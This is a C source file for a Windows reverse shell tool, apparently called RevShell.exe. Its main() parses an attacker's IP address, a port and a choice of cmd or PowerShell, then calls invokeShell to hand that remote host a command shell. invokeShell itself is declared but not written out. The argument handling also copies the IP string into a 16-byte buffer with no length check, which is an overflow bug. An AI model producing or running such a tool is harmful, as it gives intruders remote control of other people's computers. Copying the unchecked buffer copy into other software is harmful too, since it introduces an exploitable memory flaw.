#include <stdio.h>
#include <string.h>
#include <tchar.h>

#include <winsock2.h>
#include <ws2tcpip.h>
#include <Windows.h>

#pragma comment(lib, "ws2_32")

WSADATA wsaData;
SOCKET sock;
STARTUPINFO startInfo;
PROCESS_INFORMATION procInfo;
struct sockaddr_in sockAddr;

enum shells {
    CMD,
    POWERSHELL
};

bool invokeShell(const char*, int, int shell);
bool validateIpAddress(const char*);
bool validatePort(int);

int main(int argc, char** argv)
{
    char host_addr[16];
    int host_port = 12345;
    int sh = CMD;

    if (argc < 3 || argc > 4) {
        printf("Usage:\n\tRevShell.exe IP PORT [cmd|powershell]\n");
        exit(0);
    }

    int len = (int)strlen(argv[1]);
    memcpy(host_addr, argv[1], len);
    if(len < 16)
        host_addr[len] = '\0';

    host_port = atoi(argv[2]);
    
    if (argc == 4) {
        if (!strcmp(argv[3], "cmd")) {
            sh = CMD;
        }
        else if (!strcmp(argv[3], "powershell")) {
            sh = POWERSHELL;
        }
    }

    printf("[+] SELECTED SHELL: \t%d\n", sh);

    if (validateIpAddress(argv[1])) {
        printf("[+] VALID IP ADDRESS: \t%s\n", host_addr);
    }
    else {
        printf("[-] INVALID IP ADDRESS\n");
    }

    if (validatePort(host_port)) {
        printf("[+] VALID IP PORT: \t%d\n", host_port);
    }
    else {
        printf("[-] INVALID PORT\n");
    }

    if (!invokeShell(host_addr, host_port, sh)) {
        exit(-1);
    }
    
    getchar();
    exit(0);
}